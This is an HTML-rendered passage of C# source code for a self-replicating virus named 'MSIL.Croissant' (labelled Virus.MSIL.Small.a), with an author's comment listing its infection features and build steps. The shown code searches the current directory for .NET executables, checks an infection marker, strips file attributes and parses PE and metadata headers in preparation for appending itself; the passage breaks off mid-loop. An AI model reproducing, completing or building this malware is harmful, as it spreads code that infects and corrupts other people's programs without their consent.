<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.MSIL.Small.a - croissant.cs.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">/*
MSIL.Croissant by roy g biv (better than any Donut ;) )

some of its features:
- parasitic direct action infector of .NET exe (but not looking at suffix)
- light platform dependence (works on 32-bit and 64-bit Intel, untested on big-endian)
- infects files in current directory
- EPO (appends to random method)
- section attributes are not altered
- no infect files with data outside of image (eg self-extractors)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm
---

C++ compatibility:
No major changes, but requires disabling (somehow) of native code generation

JScript compatibility:
No major changes, but requires support for #US stream
This means check for #US stream, calculation of ustringsdelta, and change to binder file

VBScript compatibility:
Major changes - complete rewrite
---

known bugs: no exception handling because EH structures are not copied to host
This means that replicants will crash if anything goes wrong (eg file in use)
---

to build this thing:

1. csc croissnt.cs
2. ildasm -out:croissnt.il croissnt.exe
3. in croissnt.il, replace all "loca.s" with "loca" (force use of long indexes for variables)
4. in croissnt.il, replace all "loc.s" with "loc" (force use of long indexes for variables)
5. in croissnt.il, replace all "loc." with "loc " (force use of long indexes for variables)
6. ilasm croissnt.il
7. if any branch is out of range, then remove ".s" from branch, then repeat step 6
8. bind
*/</span><span class="sc0">

</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Diagnostics</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Runtime</span><span class="sc10">.</span><span class="sc11">InteropServices</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">class</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">()</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* no Unicode strings allowed, so create a string object dynamically
           demo version, current directory only
        */</span><span class="sc0">

        </span><span class="sc11">String</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Directory</span><span class="sc10">.</span><span class="sc11">GetFiles</span><span class="sc10">(</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToChar</span><span class="sc10">(</span><span class="sc4">0x2e</span><span class="sc10">)));</span><span class="sc0">

        </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">String</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">DateTime</span><span class="sc0"> </span><span class="sc11">lastwrite</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc1">/* check for infection marker (seconds == 0) */</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">lastwrite</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">GetLastWriteTime</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">)).</span><span class="sc11">Second</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">FileAttributes</span><span class="sc0"> </span><span class="sc11">attr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">GetAttributes</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetAttributes</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">fs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc11">Byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">[</span><span class="sc4">0xfc</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x40</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x5a4d</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">lfanew</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc1">/* the only 32-bit dependencies are filesize (must be &lt; 2Gb) and image base (must be &lt; 4Gb) */</span><span class="sc0">

                    </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">lfanew</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x3c</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                    </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xfc</span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc1">/* PE file
                       Intel 386+ or IA64 (64-bit?  yeah baby yeah!)
                       not a system file, not for UP systems, not a DLL
                       "32-bit" executable
                       GUI or CUI
                       not a WDM driver
                       no attribute certificates
                       MSIL file
                    */</span><span class="sc0">

                    </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">;</span><span class="sc0">

                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x00004550</span><span class="sc10">)</span><span class="sc0">
                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x14c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xb4</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">)</span><span class="sc0">
                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">0x17</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x70</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x102</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x102</span><span class="sc10">)</span><span class="sc0">
                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x5c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0">
                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">0x5f</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">&amp;=</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x98</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                     </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0xe8</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                       </span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc1">/* read entire section table */</span><span class="sc0">

                        </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0xe4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc11">Int32</span><span class="sc0">  </span><span class="sc11">sectsize</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">Byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">sect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">[(</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sectsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">0x28</span><span class="sc10">)];</span><span class="sc0">

                        </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">sect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sectsize</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc1">/* copy last section to fixed location */</span><span class="sc0">

                        </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">lastsect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(-</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">));</span><span class="sc0">

                        </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc1">/* read-only last section (because .NET code will not run in writeable section),
                           and no appended bytes
                        */</span><span class="sc0">

                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">0x1f</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                         </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">))</span><span class="sc0">
                           </span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">sectcopy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sectsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc10">;</span><span class="sc0">

                            </span><span class="sc1">/* no subroutines allowed, so inline rvatoraw() */</span><span class="sc0">

                            </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">sect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sectcopy</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">0x28</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">rootptroff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">sect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sectcopy</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">));</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">

                            </span><span class="sc1">/* get host Metadata root RVA and size */</span><span class="sc0">

                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xa0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x30</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc1">/* check for no StrongNameSignature
                               or VTableFixups (because we will move a method)
                            */</span><span class="sc0">

                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xbc</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xcc</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">Int64</span><span class="sc0"> </span><span class="sc11">valid</span><span class="sc10">;</span><span class="sc0">

                                </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt64</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xa0</span><span class="sc10">));</span><span class="sc0">
                                </span><span class="sc11">sectcopy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sectsize</span><span class="sc10">;</span><span class="sc0">
                                </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">sect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sectcopy</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">0x28</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc1">/* read host Metadata root header */</span><span class="sc0">

                                </span><span class="sc11">Int32</span><span class="sc0">  </span><span class="sc11">rootoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">sect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sectcopy</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)),</span><span class="sc0"> </span><span class="sc11">rootsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">valid</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                                </span><span class="sc11">Byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">rootold</span><span class="sc10">;</span><span class="sc0">

                                </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">[(</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rootsize</span><span class="sc10">)],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rootsize</span><span class="sc10">);</span><span class="sc0">

                                </span><span class="sc1">/* check signature and version, to be certain */</span><span class="sc0">

                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt64</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x00010001424a5342</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* BJSB, v1.1 only */</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">Int32</span><span class="sc0">   </span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">Int16</span><span class="sc0">   </span><span class="sc11">streams</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">Int32</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Int32</span><span class="sc10">[(</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">streams</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcpy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">];</span><span class="sc0">

                                    </span><span class="sc1">/* skip any extra data */</span><span class="sc0">

                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rootold</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* 1 == STGHDR_EXTRADATA */</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">

                                    </span><span class="sc11">Byte</span><span class="sc0">  </span><span class="sc11">heapsizes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">schemaind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">stringsind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

                                    </span><span class="sc5">do</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">
